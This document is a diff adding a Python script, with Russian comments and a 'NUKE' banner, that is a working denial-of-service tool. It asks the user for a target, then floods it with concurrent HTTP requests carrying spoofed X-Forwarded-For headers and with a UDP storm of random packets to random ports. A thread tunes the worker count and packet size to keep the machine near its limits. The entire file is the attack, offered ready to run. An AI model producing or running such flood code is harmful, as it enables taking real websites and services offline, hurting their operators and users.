@@ -1,0 +1,89 @@
+создайте файл py
+create py file
+import asyncio
+import socket
+import random
+import psutil
+from aiohttp import ClientSession, TCPConnector
+
+class NuclearCore:
+    def __init__(self):
+        self.MAX_CPU = 85  # Максимум 85% процессора
+        self.MAX_RAM = 3000  # Лимит 3GB оперативной памяти
+        self.target = ""
+        self.attack_params = {
+            "http_workers": 400,  # Увеличено в 2.6x
+            "udp_packet_size": 2048,  # Увеличено до 2KB
+            "dynamic_throttle": False  # Отключено для максимум мощности
+        }
+
+    def _resource_manager(self):
+        """Агрессивное управление ресурсами"""
+        while True:
+            cpu = psutil.cpu_percent()
+            ram = psutil.virtual_memory().used / (1024 * 1024)  # в MB
+
+            # Динамическая регулировка только при критических значениях
+            if cpu > self.MAX_CPU:
+                self.attack_params["http_workers"] = int(self.attack_params["http_workers"] * 0.95)
+            
+            if ram > self.MAX_RAM:
+                self.attack_params["udp_packet_size"] = max(1024, self.attack_params["udp_packet_size"] - 256)
+
+    async def _http_overlord(self):
+        """Турбо-режим HTTP"""
+        connector = TCPConnector(limit=self.attack_params["http_workers"], ssl=False)
+        async with ClientSession(connector=connector) as s:
+            headers = {
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+            }
+            while True:
+                try:
+                    await s.get(
+                        self.target,
+                        headers=headers,
+                        timeout=1.5,
+                        proxy=None  # Убрано для максимальной скорости
+                    )
+                except:
+                    pass
+
+    def _udp_cyclone(self):
+        """Экстремальный UDP-шторм"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)  # 4MB buffer
+        payload = random._urandom(self.attack_params["udp_packet_size"])
+        target_ip = self.target.split("//")[-1].split("/")[0] if "//" in self.target else self.target
+        
+        while True:
+            try:
+                # Пакетная отправка 500 пакетов за вызов
+                for _ in range(500):
+                    sock.sendto(payload, (target_ip, random.randint(1, 65535)))
+            except Exception as e:
+                print(f"UDP Error: {str(e)}")
+
+    def start_attack(self):
+        """Запуск ядерной атаки"""
+        import threading
+        threading.Thread(target=self._resource_manager, daemon=True).start()
+        threading.Thread(target=self._udp_cyclone, daemon=True).start()
+        asyncio.run(self._http_overlord())
+
+    def menu(self):
+        print("""
+    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
+    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
+    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
+    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
+    ██║ ╚████║╚██████╔╝██║  ██╗███████╗
+    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
+        """)
+        self.target = input("[!] ВВЕДИТЕ ЦЕЛЬ: ")
+        if not self.target.startswith(("http://", "https://")):
+            self.target = f"http://{self.target}"
+        self.start_attack()
+
+if __name__ == "__main__":
+    NuclearCore().menu()
